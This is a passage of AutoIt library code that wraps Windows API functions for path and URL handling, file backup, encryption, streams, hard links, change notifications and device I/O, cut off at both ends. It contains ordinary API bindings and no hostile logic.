		Local $aret = DllCall("shlwapi.dll", "bool", "PathStripToRootW", "wstr", $sfilepath)
		If @error OR NOT $aret[0] Then Return SetError(@error, @extended, "")
		Return $aret[1]
	EndFunc

	Func _winapi_pathundecorate($sfilepath)
		Local $aret = DllCall("shlwapi.dll", "none", "PathUndecorateW", "wstr", $sfilepath)
		If @error Then Return SetError(@error, @extended, "")
		Return $aret[1]
	EndFunc

	Func _winapi_pathunexpandenvstrings($sfilepath)
		Local $aret = DllCall("shlwapi.dll", "bool", "PathUnExpandEnvStringsW", "wstr", $sfilepath, "wstr", "", "uint", 4096)
		If @error OR NOT $aret[0] Then Return SetError(@error, @extended, "")
		Return $aret[2]
	EndFunc

	Func _winapi_pathunmakesystemfolder($sfilepath)
		Local $aret = DllCall("shlwapi.dll", "bool", "PathUnmakeSystemFolderW", "wstr", $sfilepath)
		If @error Then Return SetError(@error, @extended, False)
		Return $aret[0]
	EndFunc

	Func _winapi_pathunquotespaces($sfilepath)
		Local $aret = DllCall("shlwapi.dll", "none", "PathUnquoteSpacesW", "wstr", $sfilepath)
		If @error Then Return SetError(@error, @extended, "")
		Return $aret[1]
	EndFunc

	Func _winapi_pathyetanothermakeuniquename($sfilepath)
		Local $aret = DllCall("shell32.dll", "int", "PathYetAnotherMakeUniqueName", "wstr", "", "wstr", $sfilepath, "ptr", 0, "ptr", 0)
		If @error OR NOT $aret[0] Then Return SetError(@error, @extended, "")
		Return $aret[1]
	EndFunc

	Func _winapi_shellgetimagelist($bsmall = False)
		Local $plarge, $psmall, $tptr = DllStructCreate("ptr")
		If $bsmall Then
			$plarge = 0
			$psmall = DllStructGetPtr($tptr)
		Else
			$plarge = DllStructGetPtr($tptr)
			$psmall = 0
		EndIf
		Local $aret = DllCall("shell32.dll", "int", "Shell_GetImageLists", "ptr", $plarge, "ptr", $psmall)
		If @error OR NOT $aret[0] Then Return SetError(@error, @extended, 0)
		Return DllStructGetData($tptr, 1)
	EndFunc

	Func _winapi_urlapplyscheme($surl, $iflags = 1)
		Local $aret = DllCall("shlwapi.dll", "long", "UrlApplySchemeW", "wstr", $surl, "wstr", "", "dword*", 4096, "dword", $iflags)
		If @error Then Return SetError(@error, @extended, "")
		If $aret[0] Then Return SetError(10, $aret[0], "")
		Return $aret[2]
	EndFunc

	Func _winapi_urlcanonicalize($surl, $iflags)
		Local $aret = DllCall("shlwapi.dll", "long", "UrlCanonicalizeW", "wstr", $surl, "wstr", "", "dword*", 4096, "dword", $iflags)
		If @error Then Return SetError(@error, @extended, "")
		If $aret[0] Then Return SetError(10, $aret[0], "")
		Return $aret[2]
	EndFunc

	Func _winapi_urlcombine($surl, $spart, $iflags = 0)
		Local $aret = DllCall("shlwapi.dll", "long", "UrlCombineW", "wstr", $surl, "wstr", $spart, "wstr", "", "dword*", 4096, "dword", $iflags)
		If @error Then Return SetError(@error, @extended, "")
		If $aret[0] Then Return SetError(10, $aret[0], "")
		Return $aret[3]
	EndFunc

	Func _winapi_urlcompare($surl1, $surl2, $bignoreslash = False)
		Local $aret = DllCall("shlwapi.dll", "int", "UrlCompareW", "wstr", $surl1, "wstr", $surl2, "bool", $bignoreslash)
		If @error Then Return SetError(@error, @extended, 0)
		Return $aret[0]
	EndFunc

	Func _winapi_urlcreatefrompath($sfilepath)
		Local $aret = DllCall("shlwapi.dll", "long", "UrlCreateFromPathW", "wstr", $sfilepath, "wstr", "", "dword*", 4096, "dword", 0)
		If @error Then Return SetError(@error, @extended, "")
		If $aret[0] < 0 OR $aret[0] > 1 Then
			Return SetError(10, $aret[0], "")
		EndIf
		Return $aret[2]
	EndFunc

	Func _winapi_urlfixup($surl)
		Local $aret = DllCall("shlwapi.dll", "long", "UrlFixupW", "wstr", $surl, "wstr", "", "dword", 4096)
		If @error Then Return SetError(@error, @extended, "")
		If $aret[0] Then Return SetError(10, $aret[0], "")
		Return $aret[2]
	EndFunc

	Func _winapi_urlgetpart($surl, $ipart)
		Local $aret = DllCall("shlwapi.dll", "long", "UrlGetPartW", "wstr", $surl, "wstr", "", "dword*", 4096, "dword", $ipart, "dword", 0)
		If @error Then Return SetError(@error, @extended, "")
		If $aret[0] Then Return SetError(10, $aret[0], "")
		Return $aret[2]
	EndFunc

	Func _winapi_urlhash($surl, $ilength = 32)
		If $ilength <= 0 OR $ilength > 256 Then Return SetError(256, 0, 0)
		Local $tdata = DllStructCreate("byte[" & $ilength & "]")
		Local $aret = DllCall("shlwapi.dll", "long", "UrlHashW", "wstr", $surl, "struct*", $tdata, "dword", $ilength)
		If @error Then Return SetError(@error + 10, @extended, 0)
		If $aret[0] Then Return SetError(10, $aret[0], 0)
		Return DllStructGetData($tdata, 1)
	EndFunc

	Func _winapi_urlis($surl, $itype = 0)
		Local $aret = DllCall("shlwapi.dll", "bool", "UrlIsW", "wstr", $surl, "uint", $itype)
		If @error Then Return SetError(@error, @extended, False)
		Return $aret[0]
	EndFunc

#EndRegion Public Functions
#Region Internal Functions

	Func __us($sstring, $ilength = 0)
		If $ilength Then
			$sstring = StringLeft($sstring, $ilength)
		Else
			$ilength = StringLen($sstring)
		EndIf
		Local $tus = DllStructCreate("ushort;ushort;ptr;wchar[" & ($ilength + 1) & "]")
		DllStructSetData($tus, 1, 2 * StringLen($sstring))
		DllStructSetData($tus, 2, 2 * $ilength)
		DllStructSetData($tus, 3, DllStructGetPtr($tus, 4))
		DllStructSetData($tus, 4, $sstring)
		Return $tus
	EndFunc

#EndRegion Internal Functions
#Region Global Variables and Constants
	Global $__g_iheapsize = 8388608
	Global Const $tagdevmode = "wchar DeviceName[32];ushort SpecVersion;ushort DriverVersion;ushort Size;ushort DriverExtra;dword Fields;short Orientation;short PaperSize;short PaperLength;short PaperWidth;short Scale;short Copies;short DefaultSource;short PrintQuality;short Color;short Duplex;short YResolution;short TTOption;short Collate;wchar FormName[32];ushort Unused1;dword Unused2[3];dword Nup;dword Unused3;dword ICMMethod;dword ICMIntent;dword MediaType;dword DitherType;dword Reserved1;dword Reserved2;dword PanningWidth;dword PanningHeight"
	Global Const $tagdevnames = "ushort DriverOffset;ushort DeviceOffset;ushort OutputOffset;ushort Default"
	Global Const $tagfileinfo = "uint64 CreationTime;uint64 LastAccessTime;uint64 LastWriteTime;uint64 ChangeTime;dword Attributes"
	Global Const $tagfile_id_descriptor = "dword Size;uint Type;" & $tagguid
	Global Const $tagwin32_find_stream_data = "int64 StreamSize;wchar StreamName[296]"
	Global Const $tagwin32_stream_id = "dword StreamId;dword StreamAttributes;int64 Size;dword StreamNameSize;wchar StreamName[1]"
#EndRegion Global Variables and Constants
#Region Functions list
#EndRegion Functions list
#Region Public Functions

	Func _winapi_backupread($hfile, $pbuffer, $ilength, ByRef $ibytes, ByRef $pcontext, $bsecurity = False)
		$ibytes = 0
		Local $aret = DllCall("kernel32.dll", "bool", "BackupRead", "handle", $hfile, "struct*", $pbuffer, "dword", $ilength, "dword*", 0, "bool", 0, "bool", $bsecurity, "ptr*", $pcontext)
		If @error OR NOT $aret[0] Then Return SetError(@error, @extended, False)
		$ibytes = $aret[4]
		$pcontext = $aret[7]
		Return $aret[0]
	EndFunc

	Func _winapi_backupreadabort(ByRef $pcontext)
		Local $aret = DllCall("kernel32.dll", "bool", "BackupRead", "handle", 0, "ptr", 0, "dword", 0, "dword*", 0, "bool", 1, "bool", 0, "ptr*", $pcontext)
		If @error OR NOT $aret[0] Then Return SetError(@error, @extended, False)
		$pcontext = $aret[7]
		Return $aret[0]
	EndFunc

	Func _winapi_backupseek($hfile, $iseek, ByRef $ibytes, ByRef $pcontext)
		$ibytes = 0
		Local $aret = DllCall("kernel32.dll", "bool", "BackupSeek", "handle", $hfile, "dword", _winapi_lodword($iseek), "dword", _winapi_hidword($iseek), "dword*", 0, "dword*", 0, "ptr*", $pcontext)
		If @error OR NOT $aret[0] Then Return SetError(@error, @extended, False)
		$ibytes = __winapi_makeqword($aret[4], $aret[5])
		$pcontext = $aret[6]
		Return $aret[0]
	EndFunc

	Func _winapi_backupwrite($hfile, $pbuffer, $ilength, ByRef $ibytes, ByRef $pcontext, $bsecurity = False)
		$ibytes = 0
		Local $aret = DllCall("kernel32.dll", "bool", "BackupWrite", "handle", $hfile, "struct*", $pbuffer, "dword", $ilength, "dword*", 0, "bool", 0, "bool", $bsecurity, "ptr*", $pcontext)
		If @error OR NOT $aret[0] Then Return SetError(@error, @extended, False)
		$ibytes = $aret[4]
		$pcontext = $aret[7]
		Return $aret[0]
	EndFunc

	Func _winapi_backupwriteabort(ByRef $pcontext)
		Local $aret = DllCall("kernel32.dll", "bool", "BackupWrite", "handle", 0, "ptr", 0, "dword", 0, "dword*", 0, "bool", 1, "bool", 0, "ptr*", $pcontext)
		If @error OR NOT $aret[0] Then Return SetError(@error, @extended, False)
		$pcontext = $aret[7]
		Return $aret[0]
	EndFunc

	Func _winapi_copyfileex($sexistingfile, $snewfile, $iflags = 0, $pprogressproc = 0, $pdata = 0)
		Local $aret = DllCall("kernel32.dll", "bool", "CopyFileExW", "wstr", $sexistingfile, "wstr", $snewfile, "ptr", $pprogressproc, "struct*", $pdata, "bool*", 0, "dword", $iflags)
		If @error Then Return SetError(@error, @extended, 0)
		Return $aret[0]
	EndFunc

	Func _winapi_createdirectory($sdir, $tsecurity = 0)
		Local $aret = DllCall("kernel32.dll", "bool", "CreateDirectoryW", "wstr", $sdir, "struct*", $tsecurity)
		If @error Then Return SetError(@error, @extended, False)
		Return $aret[0]
	EndFunc

	Func _winapi_createdirectoryex($snewdir, $stemplatedir, $tsecurity = 0)
		Local $aret = DllCall("kernel32.dll", "bool", "CreateDirectoryExW", "wstr", $stemplatedir, "wstr", $snewdir, "struct*", $tsecurity)
		If @error Then Return SetError(@error, @extended, False)
		Return $aret[0]
	EndFunc

	Func _winapi_createfileex($sfilepath, $icreation, $iaccess = 0, $ishare = 0, $iflagsandattributes = 0, $tsecurity = 0, $htemplate = 0)
		Local $aret = DllCall("kernel32.dll", "handle", "CreateFileW", "wstr", $sfilepath, "dword", $iaccess, "dword", $ishare, "struct*", $tsecurity, "dword", $icreation, "dword", $iflagsandattributes, "handle", $htemplate)
		If @error Then Return SetError(@error, @extended, 0)
		If $aret[0] = Ptr(-1) Then Return SetError(10, _winapi_getlasterror(), 0)
		Return $aret[0]
	EndFunc

	Func _winapi_createfilemapping($hfile, $isize = 0, $sname = "", $iprotect = 4, $tsecurity = 0)
		Local $stypeofname = "wstr"
		If NOT StringStripWS($sname, $str_stripleading + $str_striptrailing) Then
			$stypeofname = "ptr"
			$sname = 0
		EndIf
		Local $aret = DllCall("kernel32.dll", "handle", "CreateFileMappingW", "handle", $hfile, "struct*", $tsecurity, "dword", $iprotect, "dword", _winapi_hidword($isize), "dword", _winapi_lodword($isize), $stypeofname, $sname)
		If @error Then Return SetError(@error, @extended, 0)
		Return SetExtended(_winapi_getlasterror(), $aret[0])
	EndFunc

	Func _winapi_createhardlink($snewfile, $sexistingfile)
		Local $aret = DllCall("kernel32.dll", "bool", "CreateHardLinkW", "wstr", $snewfile, "wstr", $sexistingfile, "ptr", 0)
		If @error Then Return SetError(@error, @extended, False)
		Return $aret[0]
	EndFunc

	Func _winapi_createobjectid($sfilepath)
		Local $hfile = _winapi_createfileex($sfilepath, $open_existing, 0, $file_share_readwrite, $file_flag_backup_semantics)
		If @error Then Return SetError(@error + 20, @extended, 0)
		Local $tfoid = DllStructCreate("byte[16];byte[48]")
		Local $aret = DllCall("kernel32.dll", "bool", "DeviceIoControl", "handle", $hfile, "dword", 590016, "ptr", 0, "dword", 0, "struct*", $tfoid, "dword", DllStructGetSize($tfoid), "dword*", 0, "ptr", 0)
		If __checkerrorclosehandle($aret, $hfile) Then Return SetError(@error, @extended, 0)
		Local $tguid = DllStructCreate($tagguid)
		_winapi_movememory($tguid, $tfoid, 16)
		Return $tguid
	EndFunc

	Func _winapi_createsymboliclink($ssymlink, $starget, $bdirectory = False)
		If $bdirectory Then
			$bdirectory = 1
		EndIf
		Local $aret = DllCall("kernel32.dll", "boolean", "CreateSymbolicLinkW", "wstr", $ssymlink, "wstr", $starget, "dword", $bdirectory)
		If @error Then Return SetError(@error, @extended, False)
		Return $aret[0]
	EndFunc

	Func _winapi_decryptfile($sfilepath)
		Local $aret = DllCall("advapi32.dll", "bool", "DecryptFileW", "wstr", $sfilepath, "dword", 0)
		If @error Then Return SetError(@error, @extended, False)
		Return $aret[0]
	EndFunc

	Func _winapi_definedosdevice($sdevice, $iflags, $sfilepath = "")
		Local $stypeofpath = "wstr"
		If NOT StringStripWS($sfilepath, $str_stripleading + $str_striptrailing) Then
			$stypeofpath = "ptr"
			$sfilepath = 0
		EndIf
		Local $aret = DllCall("kernel32.dll", "bool", "DefineDosDeviceW", "dword", $iflags, "wstr", $sdevice, $stypeofpath, $sfilepath)
		If @error Then Return SetError(@error, @extended, False)
		Return $aret[0]
	EndFunc

	Func _winapi_deletefile($sfilepath)
		Local $aret = DllCall("kernel32.dll", "bool", "DeleteFileW", "wstr", $sfilepath)
		If @error Then Return SetError(@error, @extended, False)
		Return $aret[0]
	EndFunc

	Func _winapi_deleteobjectid($sfilepath)
		Local $hfile = _winapi_createfileex($sfilepath, $open_existing, $generic_write, $file_share_readwrite, $file_flag_backup_semantics)
		If @error Then Return SetError(@error + 20, @extended, 0)
		Local $aret = DllCall("kernel32.dll", "bool", "DeviceIoControl", "handle", $hfile, "dword", 589984, "ptr", 0, "dword", 0, "ptr", 0, "dword", 0, "dword*", 0, "ptr", 0)
		If __checkerrorclosehandle($aret, $hfile) Then Return SetError(@error, @extended, 0)
		Return 1
	EndFunc

	Func _winapi_deletevolumemountpoint($smountedpath)
		Local $aret = DllCall("kernel32.dll", "bool", "DeleteVolumeMountPointW", "wstr", $smountedpath)
		If @error Then Return SetError(@error, @extended, 0)
		Return $aret[0]
	EndFunc

	Func _winapi_deviceiocontrol($hdevice, $icontrolcode, $pinbuffer = 0, $iinbuffersize = 0, $poutbuffer = 0, $ioutbuffersize = 0)
		Local $aret = DllCall("kernel32.dll", "bool", "DeviceIoControl", "handle", $hdevice, "dword", $icontrolcode, "struct*", $pinbuffer, "dword", $iinbuffersize, "struct*", $poutbuffer, "dword", $ioutbuffersize, "dword*", 0, "ptr", 0)
		If @error Then Return SetError(@error, @extended, False)
		Return SetExtended($aret[7], $aret[0])
	EndFunc

	Func _winapi_duplicateencryptioninfofile($ssrcfilepath, $sdestfilepath, $icreation = 2, $iattributes = 0, $tsecurity = 0)
		Local $aret = DllCall("advapi32.dll", "dword", "DuplicateEncryptionInfoFile", "wstr", $ssrcfilepath, "wstr", $sdestfilepath, "dword", $icreation, "dword", $iattributes, "struct*", $tsecurity)
		If @error Then Return SetError(@error, @extended, 0)
		If $aret[0] Then Return SetError(10, $aret[0], 0)
		Return 1
	EndFunc

	Func _winapi_ejectmedia($sdrive)
		Local $hfile = _winapi_createfileex("\\.\" & $sdrive, $open_existing, $generic_read, $file_share_readwrite)
		If @error Then Return SetError(@error + 20, @extended, 0)
		Local $aret = DllCall("kernel32.dll", "bool", "DeviceIoControl", "handle", $hfile, "dword", 2967560, "ptr", 0, "dword", 0, "ptr", 0, "dword", 0, "dword*", 0, "ptr", 0)
		If __checkerrorclosehandle($aret, $hfile) Then Return SetError(@error, @extended, 0)
		Return 1
	EndFunc

	Func _winapi_encryptfile($sfilepath)
		Local $aret = DllCall("advapi32.dll", "bool", "EncryptFileW", "wstr", $sfilepath)
		If @error Then Return SetError(@error, @extended, False)
		Return $aret[0]
	EndFunc

	Func _winapi_encryptiondisable($sdir, $bdisable)
		Local $aret = DllCall("advapi32.dll", "bool", "EncryptionDisable", "wstr", $sdir, "bool", $bdisable)
		If @error Then Return SetError(@error, @extended, False)
		Return $aret[0]
	EndFunc

	Func _winapi_enumfiles($sdir, $iflag = 0, $stemplate = "", $bexclude = False)
		Local $aret = 0, $ierror = 0
		Local $adata[501][7] = [[0]]
		Local $hdir = _winapi_createfileex($sdir, $open_existing, 1, $file_share_any, $file_flag_backup_semantics)
		If @error Then Return SetError(@error + 20, @extended, 0)
		Local $pbuffer = __heapalloc($__g_iheapsize)
		If @error Then
			$ierror = @error
		Else
			Local $tiosb = DllStructCreate("ptr;ulong_ptr")
			$aret = DllCall("ntdll.dll", "uint", "ZwQueryDirectoryFile", "handle", $hdir, "ptr", 0, "ptr", 0, "ptr", 0, "struct*", $tiosb, "struct*", $pbuffer, "ulong", 8388608, "uint", 1, "boolean", 0, "ptr", 0, "boolean", 1)
			If @error OR $aret[0] Then
				$ierror = @error + 40
			EndIf
		EndIf
		DllCall("kernel32.dll", "bool", "CloseHandle", "handle", $hdir)
		If $ierror Then
			__heapfree($pbuffer, 1)
			If IsArray($aret) Then
				Return SetError(10, $aret[0], 0)
			Else
				Return SetError($ierror, 0, 0)
			EndIf
		EndIf
		Local $tfdi, $iattrib, $starget, $ilength = 0, $ioffset = 0
		Do
			$ilength += $ioffset
			$tfdi = DllStructCreate("ulong;ulong;int64;int64;int64;int64;int64;int64;ulong;ulong;wchar[" & (DllStructGetData(DllStructCreate("ulong", $pbuffer + $ilength + 60), 1) / 2) & "]", $pbuffer + $ilength)
			$starget = DllStructGetData($tfdi, 11)
			$iattrib = DllStructGetData($tfdi, 9)
			$ioffset = DllStructGetData($tfdi, 1)
			Switch $starget
				Case ".", ".."
					ContinueLoop
				Case Else
					Switch $iflag
						Case 1, 2
							If BitAND($iattrib, 16) Then
								If $iflag = 1 Then
									ContinueLoop
								EndIf
							Else
								If $iflag = 2 Then
									ContinueLoop
								EndIf
							EndIf
					EndSwitch
					If $stemplate Then
						$aret = DllCall("shlwapi.dll", "int", "PathMatchSpecW", "wstr", $starget, "wstr", $stemplate)
						If @error OR ($aret[0] AND $bexclude) OR (NOT $aret[0] AND NOT $bexclude) Then
							ContinueLoop
						EndIf
					EndIf
			EndSwitch
			__inc($adata, 500)
			$adata[$adata[0][0]][0] = $starget
			$adata[$adata[0][0]][1] = DllStructGetData($tfdi, 3)
			$adata[$adata[0][0]][2] = DllStructGetData($tfdi, 4)
			$adata[$adata[0][0]][3] = DllStructGetData($tfdi, 5)
			$adata[$adata[0][0]][4] = DllStructGetData($tfdi, 7)
			$adata[$adata[0][0]][5] = DllStructGetData($tfdi, 8)
			$adata[$adata[0][0]][6] = $iattrib
		Until NOT $ioffset
		__heapfree($pbuffer)
		__inc($adata, -1)
		Return $adata
	EndFunc

	Func _winapi_enumfilestreams($sfilepath)
		Local $tdata = DllStructCreate("byte[32768]")
		Local $pdata = DllStructGetPtr($tdata)
		Local $adata[101][2] = [[0]]
		Local $hfile = _winapi_createfileex($sfilepath, $open_existing, 0, $file_share_readwrite, $file_flag_backup_semantics)
		If @error Then Return SetError(@error + 20, @extended, 0)
		Local $ierror = 0
		Local $tiosb = DllStructCreate("ptr;ulong_ptr")
		Local $aret = DllCall("ntdll.dll", "long", "ZwQueryInformationFile", "handle", $hfile, "struct*", $tiosb, "ptr", $pdata, "ulong", 32768, "uint", 22)
		If @error Then $ierror = @error
		DllCall("kernel32.dll", "bool", "CloseHandle", "handle", $hfile)
		If $ierror Then Return SetError($ierror, 0, 0)
		If $aret[0] Then Return SetError(10, $aret[0], 0)
		Local $tfsi, $ilength = 0, $ioffset = 0
		Do
			$ilength += $ioffset
			$tfsi = DllStructCreate("ulong;ulong;int64;int64;wchar[" & (DllStructGetData(DllStructCreate("ulong", $pdata + $ilength + 4), 1) / 2) & "]", $pdata + $ilength)
			__inc($adata)
			$adata[$adata[0][0]][0] = DllStructGetData($tfsi, 5)
			$adata[$adata[0][0]][1] = DllStructGetData($tfsi, 3)
			$ioffset = DllStructGetData($tfsi, 1)
		Until NOT $ioffset
		__inc($adata, -1)
		Return $adata
	EndFunc

	Func _winapi_enumhardlinks($sfilepath)
		Local $tdata = DllStructCreate("byte[32768]")
		Local $pdata = DllStructGetPtr($tdata)
		Local $hfile = _winapi_createfileex($sfilepath, $open_existing, 0, $file_share_readwrite)
		If @error Then Return SetError(@error + 20, @extended, 0)
		Local $ierror = 0
		Local $tiosb = DllStructCreate("ptr;ulong_ptr")
		Local $aret = DllCall("ntdll.dll", "long", "ZwQueryInformationFile", "handle", $hfile, "struct*", $tiosb, "ptr", $pdata, "ulong", 32768, "uint", 46)
		If @error OR $aret[0] Then
			$ierror = @error + 10
			DllCall("kernel32.dll", "bool", "CloseHandle", "handle", $hfile)
			If $aret Then Return SetError($ierror, 0, 0)
			If $aret[0] Then Return SetError(10, $ierror, 0)
		EndIf
		Local $icount = DllStructGetData(DllStructCreate("ulong;ulong", $pdata), 2)
		Local $adata[$icount + 1] = [$icount]
		Local $tflei, $hpath, $spath, $ilength = 8
		For $i = 1 To $icount
			$tflei = DllStructCreate("ulong;int64;ulong;wchar[" & (DllStructGetData(DllStructCreate("ulong", $pdata + $ilength + 16), 1)) & "]", $pdata + $ilength)
			$ierror = 0
			Do
				$hpath = _winapi_openfilebyid($hfile, DllStructGetData($tflei, 2), 1048704, $file_share_readwrite, $file_flag_backup_semantics)
				If @error Then
					$ierror = @error + 100
					ExitLoop
				EndIf
				$spath = _winapi_getfinalpathnamebyhandleex($hpath)
				If @error Then
					$ierror = @error + 200
					ExitLoop
				EndIf
			Until 1
			If $hpath Then
				DllCall("kernel32.dll", "bool", "CloseHandle", "handle", $hpath)
			EndIf
			If $ierror Then ExitLoop
			$adata[$i] = _winapi_pathappend($spath, DllStructGetData($tflei, 4))
			$ilength += DllStructGetData($tflei, 1)
		Next
		DllCall("kernel32.dll", "bool", "CloseHandle", "handle", $hfile)
		If $ierror Then Return SetError($ierror, 0, 0)
		Return $adata
	EndFunc

	Func _winapi_fileencryptionstatus($sfilepath)
		Local $aret = DllCall("advapi32.dll", "bool", "FileEncryptionStatusW", "wstr", $sfilepath, "dword*", 0)
		If @error OR NOT $aret[0] Then Return SetError(@error + 10, @extended, -1)
		Return $aret[2]
	EndFunc

	Func _winapi_fileexists($sfilepath)
		If NOT FileExists($sfilepath) Then Return 0
		If _winapi_pathisdirectory($sfilepath) Then Return SetExtended(1, 0)
		Return 1
	EndFunc

	Func _winapi_fileinuse($sfilepath)
		Local $hfile = _winapi_createfileex($sfilepath, $open_existing, $generic_read)
		If @error Then
			If @extended = 32 Then Return 1
			Return SetError(@error, @extended, 0)
		EndIf
		DllCall("kernel32.dll", "bool", "CloseHandle", "handle", $hfile)
		Return 0
	EndFunc

	Func _winapi_findclose($hsearch)
		Local $aret = DllCall("kernel32.dll", "bool", "FindClose", "handle", $hsearch)
		If @error Then Return SetError(@error, @extended, False)
		Return $aret[0]
	EndFunc

	Func _winapi_findclosechangenotification($hchange)
		Local $aret = DllCall("kernel32.dll", "bool", "FindCloseChangeNotification", "handle", $hchange)
		If @error Then Return SetError(@error, @extended, False)
		Return $aret[0]
	EndFunc

	Func _winapi_findfirstchangenotification($sdirectory, $iflags, $bsubtree = False)
		Local $aret = DllCall("kernel32.dll", "handle", "FindFirstChangeNotificationW", "wstr", $sdirectory, "bool", $bsubtree, "dword", $iflags)
		If @error OR ($aret[0] = Ptr(-1)) Then Return SetError(@error + 10, @extended, 0)
		Return $aret[0]
	EndFunc

	Func _winapi_findfirstfile($sfilepath, $tdata)
		Local $aret = DllCall("kernel32.dll", "handle", "FindFirstFileW", "wstr", $sfilepath, "struct*", $tdata)
		If @error Then Return SetError(@error, @extended, 0)
		If $aret[0] = Ptr(-1) Then Return SetError(10, _winapi_getlasterror(), 0)
		Return $aret[0]
	EndFunc

	Func _winapi_findfirstfilename($sfilepath, ByRef $slink)
		$slink = ""
		Local $aret = DllCall("kernel32.dll", "handle", "FindFirstFileNameW", "wstr", $sfilepath, "dword", 0, "dword*", 4096, "wstr", "")
		If @error OR ($aret[0] = Ptr(-1)) Then Return SetError(@error + 10, @extended, 0)
		$slink = $aret[4]
		Return $aret[0]
	EndFunc

	Func _winapi_findfirststream($sfilepath, $tdata)
		Local $aret = DllCall("kernel32.dll", "handle", "FindFirstStreamW", "wstr", $sfilepath, "uint", 0, "struct*", $tdata, "dword", 0)
		If @error Then Return SetError(@error, @extended, 0)
		If $aret[0] = Ptr(-1) Then Return SetError(10, _winapi_getlasterror(), 0)
		Return $aret[0]
	EndFunc

	Func _winapi_findnextchangenotification($hchange)
		Local $aret = DllCall("kernel32.dll", "bool", "FindNextChangeNotification", "handle", $hchange)
		If @error Then Return SetError(@error, @extended, 0)
		Return $aret[0]
	EndFunc

	Func _winapi_findnextfile($hsearch, $tdata)
		Local $aret = DllCall("kernel32.dll", "bool", "FindNextFileW", "handle", $hsearch, "struct*", $tdata)
		If @error Then Return SetError(@error, @extended, False)
		If NOT $aret[0] Then Return SetError(10, _winapi_getlasterror(), 0)
		Return $aret[0]
	EndFunc

	Func _winapi_findnextfilename($hsearch, ByRef $slink)
		$slink = ""
		Local $aret = DllCall("kernel32.dll", "bool", "FindNextFileNameW", "handle", $hsearch, "dword*", 4096, "wstr", "")
		If @error Then Return SetError(@error, @extended, False)
		If NOT $aret[0] Then Return SetError(10, _winapi_getlasterror(), 0)
		$slink = $aret[3]
		Return $aret[0]
	EndFunc

	Func _winapi_findnextstream($hsearch, $tdata)
		Local $aret = DllCall("kernel32.dll", "bool", "FindNextStreamW", "handle", $hsearch, "struct*", $tdata)
		If @error Then Return SetError(@error, @extended, False)
		If NOT $aret[0] Then Return SetError(10, _winapi_getlasterror(), 0)
		Return $aret[0]
	EndFunc

	Func _winapi_flushviewoffile($paddress, $ibytes = 0)
		Local $aret = DllCall("kernel32.dll", "bool", "FlushViewOfFile", "struct*", $paddress, "dword", $ibytes)
		If @error Then Return SetError(@error, @extended, 0)
		Return $aret[0]
	EndFunc

	Func _winapi_getbinarytype($sfilepath)
		Local $aret = DllCall("kernel32.dll", "int", "GetBinaryTypeW", "wstr", $sfilepath, "dword*", 0)
		If @error Then Return SetError(@error, @extended, 0)
		If NOT $aret[0] Then $aret[2] = 0
		Return SetExtended($aret[2], $aret[0])
	EndFunc

	Func _winapi_getcdtype($sdrive)
		Local $hfile = _winapi_createfileex("\\.\" & $sdrive, $open_existing, $generic_readwrite, $file_share_readwrite)
		If @error Then Return SetError(@error + 20, @extended, 0)
		Local $tagscsi_pass_through = "struct;ushort Length;byte ScsiStatus;byte PathId;byte TargetId;byte Lun;byte CdbLength;byte SenseInfoLength;byte DataIn;ulong DataTransferLength;ulong TimeOutValue;ulong_ptr DataBufferOffset;ulong SenseInfoOffset;byte Cdb[16];endstruct"
		Local $tspt = DllStructCreate($tagscsi_pass_through & ";byte Hdr[8]")
		Local $tcdb = DllStructCreate("byte;byte;byte[2];byte[3];byte[2];byte;byte[2];byte[4]", DllStructGetPtr($tspt, "Cdb"))
		Local $thdr = DllStructCreate("byte[4];byte;byte;byte[2]", DllStructGetPtr($tspt, "Hdr"))
		Local $isize = DllStructGetPtr($tspt, "Hdr") - DllStructGetPtr($tspt)
		DllStructSetData($tspt, "Length", $isize)
		DllStructSetData($tspt, "ScsiStatus", 0)
		DllStructSetData($tspt, "PathId", 0)
		DllStructSetData($tspt, "TargetId", 0)
		DllStructSetData($tspt, "Lun", 0)
		DllStructSetData($tspt, "CdbLength", 12)
		DllStructSetData($tspt, "SenseInfoLength", 0)
		DllStructSetData($tspt, "DataIn", 1)
		DllStructSetData($tspt, "DataTransferLength", 8)
		DllStructSetData($tspt, "TimeOutValue", 86400)
		DllStructSetData($tspt, "DataBufferOffset", $isize)
		DllStructSetData($tspt, "SenseInfoOffset", 0)
		DllStructSetData($tcdb, 1, 70)
		DllStructSetData($tcdb, 2, 0)
		DllStructSetData($tcdb, 3, 0, 1)
		DllStructSetData($tcdb, 3, 0, 2)
		DllStructSetData($tcdb, 5, 0, 1)
		DllStructSetData($tcdb, 5, 8, 2)
		DllStructSetData($tcdb, 6, 0)
		DllStructSetData($tcdb, 7, 0, 1)
		DllStructSetData($tcdb, 7, 0, 2)
		Local $aret = DllCall("kernel32.dll", "bool", "DeviceIoControl", "handle", $hfile, "dword", 315396, "struct*", $tspt, "dword", $isize, "struct*", $tspt, "dword", DllStructGetSize($tspt), "dword*", 0, "ptr", 0)
		If __checkerrorclosehandle($aret, $hfile) Then Return SetError(@error, @extended, 0)
		Return BitOR(BitShift(DllStructGetData($thdr, 4, 1), -8), DllStructGetData($thdr, 4, 2))
	EndFunc

	Func _winapi_getcompressedfilesize($sfilepath)
		Local $aret = DllCall("kernel32.dll", "dword", "GetCompressedFileSizeW", "wstr", $sfilepath, "dword*", 0)
		If @error Then Return SetError(@error, @extended, 0)
		If $aret[0] = -1 Then
			Local $ilasterror = _winapi_getlasterror()
			If $aret[2] = 0 Then Return SetError(10, $ilasterror, 0)
			If $ilasterror Then Return SetError(11, $ilasterror, 0)
		EndIf
		Return __winapi_makeqword($aret[0], $aret[2])
	EndFunc

	Func _winapi_getcompression($sfilepath)
		Local $hfile = _winapi_createfileex($sfilepath, $open_existing, $generic_read, $file_share_readwrite, $file_flag_backup_semantics)
		If @error Then Return SetError(@error + 20, @extended, 0)
		Local $aret = DllCall("kernel32.dll", "bool", "DeviceIoControl", "handle", $hfile, "dword", 589884, "ptr", 0, "dword", 0, "ushort*", 0, "dword", 2, "dword*", 0, "ptr", 0)
		If __checkerrorclosehandle($aret, $hfile) Then Return SetError(@error, @extended, -1)
		Return $aret[5]
	EndFunc

	Func _winapi_getcurrentdirectory()
		Local $aret = DllCall("kernel32.dll", "dword", "GetCurrentDirectoryW", "dword", 4096, "wstr", "")
		If @error Then Return SetError(@error, @extended, "")
		Return SetExtended($aret[0], $aret[2])
	EndFunc

	Func _winapi_getdiskfreespaceex($sdrive)
		Local $aret = DllCall("kernel32.dll", "bool", "GetDiskFreeSpaceEx", "str", $sdrive, "int64*", 0, "int64*", 0, "int64*", 0)
